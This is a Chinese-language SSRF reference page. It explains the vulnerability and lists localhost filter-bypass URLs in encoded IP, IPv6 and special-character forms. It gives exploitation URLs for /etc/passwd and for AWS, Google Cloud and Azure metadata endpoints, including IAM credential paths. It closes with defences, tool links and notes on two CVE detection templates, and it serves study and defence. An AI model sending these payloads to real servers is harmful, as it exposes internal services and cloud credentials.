# 服务端请求伪造 (SSRF)

> 服务端请求伪造（Server-Side Request Forgery，SSRF）是一种安全漏洞，攻击者可以迫使服务器代表他们执行请求。

## 目录

* [工具](#工具)
* [方法论](#方法论)
* [绕过过滤器](#绕过过滤器)
    * [默认目标](#默认目标)
    * [使用IPv6表示法绕过本地主机限制](#使用ipv6表示法绕过本地主机限制)
    * [使用CIDR绕过本地主机限制](#使用cidr绕过本地主机限制)
    * [使用短网址](#使用短网址)
    * [使用特殊字符](#使用特殊字符)

* [SSRF 利用](#ssrf-利用)
* [防御措施](#防御措施)
* [学习资源](#学习资源)

## 什么是SSRF？

服务端请求伪造（SSRF）是一种安全漏洞，攻击者可以诱使服务器向其他系统发送精心构造的请求。这种攻击通常针对位于防火墙后面且无法从外部网络直接访问的内部系统。

## SSRF 攻击场景

1. **访问内部服务**
   - 攻击者可以扫描内部网络
   - 访问内部API
   - 与内部系统交互

2. **云元数据服务**
   - 在云环境中，可以访问实例元数据服务
   - 示例：`http://169.254.169.254/latest/meta-data/` (AWS)

3. **端口扫描**
   - 扫描内部网络中的开放端口
   - 示例：`http://example.com/proxy?url=http://internal:22`

## 绕过过滤器

### 默认目标

```
http://localhost:80
http://127.0.0.1:80
http://[::]:80/
http://2130706433/       # 127.0.0.1 的十进制表示
http://0x7f000001/      # 127.0.0.1 的十六进制表示
http://127.1/
http://127.0.1/
http://0/
http://0177.0.0.1/      # 八进制表示
```

### 使用IPv6表示法绕过本地主机限制

```
http://[::1]:80
http://[::]/80
http://[::]:80/
```

### 使用CIDR绕过本地主机限制

```
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0/8
```

### 使用短网址

可以使用各种URL缩短服务来绕过过滤器：
- bit.ly
- goo.gl
- tinyurl.com

### 使用特殊字符

```
http://example.com@127.0.0.1
http://127.0.0.1:80%2523@example.com/
http://127.1.1.1:80\@example.com/
http://127.1.1.1:80/example.com/
http://127.1.1.1:80/victim.com/
http://127.1.1.1:80//example.com/
```

## SSRF 利用

### 访问内部服务

```
http://example.com/proxy?url=http://internal/admin
http://example.com/proxy?url=file:///etc/passwd
```

### 云元数据服务

#### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

#### Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
```

#### Azure
```
http://169.254.169.254/metadata/instance?api-version=2019-08-15
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/privateIpAddress?api-version=2017-08-01&format=text
```

## 防御措施

1. **输入验证**
   - 白名单允许的URL方案（http, https）
   - 验证用户输入
   - 使用正则表达式限制输入格式

2. **网络层防护**
   - 使用网络分段
   - 限制出站连接
   - 使用Web应用防火墙(WAF)

3. **应用层防护**
   - 使用URL解析库
   - 禁用URL重定向
   - 实施适当的错误处理

4. **云环境**
   - 限制元数据服务访问
   - 使用最新版本的云服务
   - 实施最小权限原则

## 工具

- [SSRFmap](https://github.com/swisskyrepo/SSRFmap) - 自动SSRF漏洞利用工具
- [Gopherus](https://github.com/tarunkant/Gopherus) - 生成SSRF有效负载
- [SSRF Sheriff](https://github.com/teknogeek/ssrf-sheriff) - 用于测试SSRF的简单SSRF测试服务器



### 八、典型漏洞 YAML 文件分析

本目录及上级目录收录了多个与 SSRF（服务器端请求伪造）相关的漏洞利用模板，以下对部分典型 YAML 文件进行详细解读：

#### 1. CVE-2021-27905.yaml
- **漏洞类型**：SSRF（Apache Solr）
- **漏洞原理**：
  Apache Solr 8.8.1 及以下版本的 ReplicationHandler 接口未对 masterUrl/leaderUrl 参数做有效校验，攻击者可利用该参数发起任意外部请求，造成 SSRF。
- **探测原理**：
  该模板通过设置 masterUrl 为外部可控地址（如 interact.sh），若目标服务器发起请求并返回特定响应，则判定存在漏洞。
- **修复建议**：升级至 8.8.2 及以上版本，严格校验外部 URL。

#### 2. vmware-vcenter-ssrf.yaml
- **漏洞类型**：SSRF（VMware vCenter）
- **漏洞原理**：
  vCenter 某接口未对 url 参数做有效校验，攻击者可利用该参数让服务器请求任意外部地址，造成 SSRF、LFI、XSS 等多重风险。
- **探测原理**：
  该模板通过 url 参数注入外部地址，若 interactsh 平台收到请求且 User-Agent 为 Java，则判定存在漏洞。
- **修复建议**：升级 vCenter，修复相关接口。

---

#### 总结
SSRF 漏洞常见于服务端对用户可控 URL/地址未做严格校验的场景。攻击者可借此访问内网、云元数据、敏感服务等，甚至造成更严重的后果。防御措施包括：
- 对所有外部请求参数做白名单校验
- 禁止服务端访问敏感内网地址
- 加强日志与异常监控，及时发现异常请求
